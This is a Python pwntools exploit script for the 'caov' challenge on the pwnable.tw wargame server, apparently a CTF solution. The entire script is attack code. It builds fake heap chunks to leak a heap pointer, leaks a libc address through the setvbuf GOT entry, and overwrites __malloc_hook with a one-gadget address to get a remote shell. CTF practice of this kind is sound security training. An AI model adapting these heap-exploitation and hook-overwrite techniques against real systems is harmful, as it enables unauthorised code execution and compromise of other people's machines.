from pwn import *

#sh = process('./caov')
sh = remote('chall.pwnable.tw', 10306)
elf = ELF('./caov')
#pause()

def editnameshort(sh, name):
	sh.sendlineafter('choice: ', b'2')
	sh.sendlineafter('name: ', name)
	sh.sendlineafter('length: ', b'0')

def editname(sh, name, keylen, key, val):
	sh.sendlineafter('choice: ', b'2')
	sh.sendlineafter('name: ', name)
	sh.sendlineafter('length: ', str(keylen))
	sh.sendlineafter('Key: ', key)
	sh.sendlineafter('Value: ', str(val))
	sh.recvuntil('Menu')

def editnamenoskip(sh, name, keylen, key, val):
	sh.sendlineafter('choice: ', b'2')
	sh.sendlineafter('name: ', name)
	sh.sendlineafter('length: ', str(keylen))
	sh.sendlineafter('Key: ', key)
	sh.sendlineafter('Value: ', str(val))
#4


fakesmallchunk = p64(0) + p64(0x21) + b'\x00' * 16 + p64(0) + p64(0x20) + b'\x41' * 16 + b'\x41' * 32 + p64(0x6032d0) + b'\x41' * 24 
editchunk = p64(0) + p64(0x41) + p64(0) * 7 + p64(0x21) + b'\x41' * 16 + p64(0x6032d0) 

sh.sendlineafter('name: ', b'CCCC')
sh.sendlineafter('key: ', b'\0' + b'a' * 0x36)
sh.sendlineafter('value: ', b'21')
editname(sh, fakesmallchunk, 0x17, b'a' * 0x16, 21)
editnameshort(sh, editchunk)
sh.recvuntil('after editing')
sh.recvuntil('Key: ')
heapstr = sh.recvuntil('\n')
heapstr = heapstr[:len(heapstr)-1] + b'\x00' * (9-len(heapstr))
heap = u64(heapstr)
sh.recvuntil('Menu')

editnamenoskip(sh, p64(0) + b'A' * 88 + p64(heap+0x50), 0x35, p64(elf.got['setvbuf']), 21)
sh.recvuntil('after editing')
sh.recvuntil('Key: ')
libcstr = sh.recvuntil('\n')
libcstr = libcstr[:len(libcstr)-1] + b'\x00' * (9-len(libcstr))
libc = u64(libcstr)-0x6fe70
sh.recvuntil('Menu')

mhook = libc + 0x3c3b10
rce = libc + 0xef6c4

redochunk = p64(0) + p64(0x71) + p64(0) * 10 + p64(0x6032d0) + p64(0) * 2 + p64(0x21)
changechunk = p64(0) + p64(0x71) + p64(mhook-0x23) + p64(0) * 9 + p64(0) * 3 + p64(0x21)
editnameshort(sh, redochunk)
editnameshort(sh, changechunk)
editname(sh, p64(0)+p64(0x71)+p64(mhook-0x23), 94, b'A' * 4, 21)
editnamenoskip(sh, p64(0)+p64(0x71)+p64(mhook-0x23), 94, b'A' * 19 + p64(rce), 21)

sh.interactive()